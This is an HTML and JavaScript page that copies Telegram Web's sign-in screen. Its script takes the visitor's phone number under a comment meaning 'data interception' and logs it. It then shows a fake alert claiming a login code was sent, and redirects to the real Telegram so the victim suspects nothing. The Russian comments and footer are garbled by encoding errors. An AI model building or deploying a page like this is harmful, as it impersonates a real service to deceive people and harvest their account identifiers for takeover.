<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Telegram Web</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#3390ec">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #37AEE2 0%, #1E96C8 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
        }

        .auth-pages__container {
            background: #fff;
            border-radius: 12px;
            width: 360px;
            padding: 40px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
            text-align: center;
        }

        .auth-image {
            margin-bottom: 24px;
        }

        .sign-logo {
            width: 64px;
            height: 64px;
            color: #3390ec;
        }

        .auth-title {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #000;
        }

        .auth-description {
            font-size: 14px;
            color: #707579;
            margin-bottom: 24px;
            line-height: 1.4;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #000;
        }

        .select-input, .text-input {
            width: 100%;
            height: 44px;
            padding: 0 16px;
            border: 1px solid #D6D9DC;
            border-radius: 8px;
            font-size: 15px;
            background: #fff;
            color: #000;
        }

        .select-input:focus, .text-input:focus {
            outline: none;
            border-color: #3390ec;
        }

        .phone-input-group {
            display: flex;
            gap: 8px;
        }

        .country-code {
            width: 80px;
        }

        .phone-number {
            flex: 1;
        }

        .btn-primary {
            width: 100%;
            height: 44px;
            background: #3390ec;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }

        .btn-primary:hover {
            background: #2b85e0;
        }

        .divider {
            margin: 24px 0;
            position: relative;
            text-align: center;
        }

        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #E6E8EB;
        }

        .divider-text {
            display: inline-block;
            background: #fff;
            padding: 0 16px;
            color: #707579;
            font-size: 14px;
            position: relative;
        }

        .btn-secondary {
            width: 100%;
            height: 44px;
            background: transparent;
            color: #3390ec;
            border: 1px solid #3390ec;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }

        .btn-secondary:hover {
            background: #3390ec;
            color: #fff;
        }

        .auth-footer {
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #E6E8EB;
        }

        .lang-link {
            color: #3390ec;
            font-size: 14px;
            text-decoration: none;
        }
    </style>
</head>
<body class="animation-level-2 has-auth-pages">
    <div class="whole" id="auth-pages">
        <div class="scrollable scrollable-y">
            <div class="tabs-container auth-pages__container" data-animation="tabs">
                <div class="tabs-tab page-sign">
                    <div class="container">
                        <div class="auth-image">
                            <svg class="sign-logo" viewBox="0 0 160 160" fill="currentColor">

                            </svg>
                        </div>
                        
                        <h2 class="auth-title">Sign in to Telegram</h2>
                        <p class="auth-description">Please confirm your country code and enter your phone number.</p>
                        
                        <div class="input-group">
                            <label class="input-label">Country</label>
                            <select class="select-input">
                                <option>Russia</option>
                                <option>United States</option>
                                <option>United Kingdom</option>
                            </select>
                        </div>
                        
                        <div class="input-group">
                            <label class="input-label">Phone Number</label>
                            <div class="phone-input-group">
                                <select class="select-input country-code">
                                    <option>+7</option>
                                    <option>+1</option>
                                    <option>+44</option>
                                </select>
                                <input type="tel" class="text-input phone-number" placeholder="Phone number">
                            </div>
                        </div>
                        
                        <button class="btn-primary" onclick="handleLogin()">NEXT</button>
                        
                        <div class="divider">
                            <span class="divider-text">OR</span>
                        </div>
                        
                        <button class="btn-secondary">Log in by QR Code</button>
                    </div>
                    
                    <div class="auth-footer">
                        <a href="#" class="lang-link">–ü–†–û–î–û–õ–ñ–ò–¢–¨ –ù–ê –†–£–°–°–ö–û–ú</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function handleLogin() {
            const country = document.querySelector('.select-input').value;
            const countryCode = document.querySelector('.country-code').value;
            const phone = document.querySelector('.phone-number').value;
            
            if (!phone) {
                alert('Please enter your phone number');
                return;
            }
            
            const fullPhone = countryCode + phone;
            
            // –ü–µ—Ä–µ—Ö–≤–∞—Ç –¥–∞–Ω–Ω—ã—Ö
            console.log('üì± Phone:', fullPhone);
            console.log('üåç Country:', country);
            
            // –ü–æ–∫–∞–∑–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∫–∞–∫ –≤ Telegram
            alert('We have sent you a code via Telegram app. Please check your other device.');
            
            // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –Ω–∞—Å—Ç–æ—è—â–∏–π Telegram
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org/';
            }, 2000);
        }
    </script>
</body>
</html>
